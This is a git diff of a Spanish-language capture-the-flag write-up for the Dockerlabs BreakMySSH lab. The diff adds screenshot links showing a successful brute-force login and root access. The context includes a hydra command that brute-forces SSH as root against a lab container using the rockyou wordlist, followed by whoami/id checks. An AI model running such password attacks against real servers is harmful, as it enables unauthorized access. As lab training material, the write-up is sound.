@@ -48,6 +48,9 @@ Dado que no existen otros vectores expuestos, se realiza un ataque de fuerza bru
 ```
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -V
 ```
+![image alt](https://github.com/orellanacarlos3179-lang/Dockerlabs-BreakMySSH-Writeup/blob/c1bc0cccd93ceef35196c32aa21be19789121479/04-fuerza%20bruta.JPEG)
+
+
 Resultado: Se identifican credenciales válidas para el usuario root.
 
 5. Post-Explotación y Verificación
@@ -61,7 +64,7 @@ whoami
 ```
 id
 ```
-
+![image alt](https://github.com/orellanacarlos3179-lang/Dockerlabs-BreakMySSH-Writeup/blob/c1bc0cccd93ceef35196c32aa21be19789121479/05-sshroot.JPEG)
 Resultado: Confirmado uid=0(root).
 
 Remediación y Buenas Prácticas de Seguridad
